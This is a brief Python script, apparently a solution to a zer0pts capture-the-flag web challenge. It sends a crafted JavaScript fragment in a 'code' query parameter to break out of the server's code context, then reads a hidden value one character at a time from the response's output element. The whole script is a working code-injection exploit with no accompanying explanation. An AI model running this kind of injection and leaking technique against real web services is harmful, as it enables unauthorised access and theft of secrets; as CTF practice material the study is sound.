import requests
import urllib

for i in range(25, 80):
    fmt = "},this.a=()=>{return(a+0)["
    x = requests.get('http://web.ctf.zer0pts.com:8002/?code=' + urllib.parse.quote_plus(fmt + str(i) + "]"))
    idx = x.content.find(b'<output>')
    print(chr(x.content[idx+8]), end='')
